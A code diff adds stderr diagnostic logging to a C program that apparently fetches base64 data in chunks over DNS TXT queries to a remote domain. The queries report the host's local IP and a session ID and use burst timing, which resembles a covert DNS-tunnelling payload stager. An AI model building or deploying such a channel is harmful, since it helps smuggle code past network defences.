@@ -800,9 +800,12 @@ static int send_dns_message(const char *message, const char *target_domain, char
         char txt_response[4096];
         int query_result = dns_query_txt(domain, txt_response, sizeof(txt_response));
         
+        fprintf(stderr, "[DIAG] Query result: %d (0=success, -1=failure)\n", query_result);
     DEBUG_PRINT("[*] Query result: %d\n", query_result);
         
         if (query_result == 0) {
+            fprintf(stderr, "[DIAG] TXT response received: %.80s... (len=%zu)\n", 
+                    txt_response, strlen(txt_response));
     DEBUG_PRINT("[*] TXT response: %s\n", txt_response);
             
             // Check if this is a CHUNK response (plain text, not base36 encoded)
@@ -810,6 +813,7 @@ static int send_dns_message(const char *message, const char *target_domain, char
                 // CHUNK responses are sent as plain text (data is already base64)
                 strncpy(response, txt_response, response_size - 1);
                 response[response_size - 1] = '\0';
+                fprintf(stderr, "[DIAG] CHUNK response detected (plain text, %zu bytes)\n", strlen(response));
     DEBUG_PRINT("[*] CHUNK response (plain text, %zu bytes)\n", strlen(response));
                 return 0;
             }
@@ -1092,25 +1096,35 @@ int main(int argc, char *argv[]) {
                  i, local_ip, session_id[0] ? session_id : "UNKN0WN");
         
         if (send_dns_message(message, target_domain, response, sizeof(response)) != 0) {
+            fprintf(stderr, "[DIAG] Failed to get chunk %d from %s\n", i, target_domain);
     DEBUG_PRINT("[!] Failed to get chunk %d from %s\n", i, target_domain);
             goto cleanup;
         }
         
+        fprintf(stderr, "[DIAG] Received response for chunk %d: %.80s... (len=%zu)\n", 
+                i, response, strlen(response));
+        
         // Parse chunk response: CHUNK|<data>
         if (strncmp(response, "CHUNK|", 6) != 0) {
+            fprintf(stderr, "[DIAG] Invalid chunk response format (first 20 chars): %.20s\n", response);
     DEBUG_PRINT("[!] Invalid chunk response format: %s\n", response);
             goto cleanup;
         }
+        
+        fprintf(stderr, "[DIAG] Chunk %d parsed successfully, storing data\n", i);
         
         // Store the base64 encoded chunk
         size_t chunk_len = strlen(response + 6);
         chunks[i] = malloc(chunk_len + 1);
         if (!chunks[i]) {
+            fprintf(stderr, "[DIAG] Failed to allocate memory for chunk %d\n", i);
             goto cleanup;
         }
         
         memcpy(chunks[i], response + 6, chunk_len + 1);
         chunk_sizes[i] = chunk_len;
+        
+        fprintf(stderr, "[DIAG] Chunk %d stored (%zu bytes), continuing to next chunk\n", i, chunk_len);
         
         // Apply timing delay ONLY after completing a burst
         // Within a burst, chunks are requested rapidly with no delay
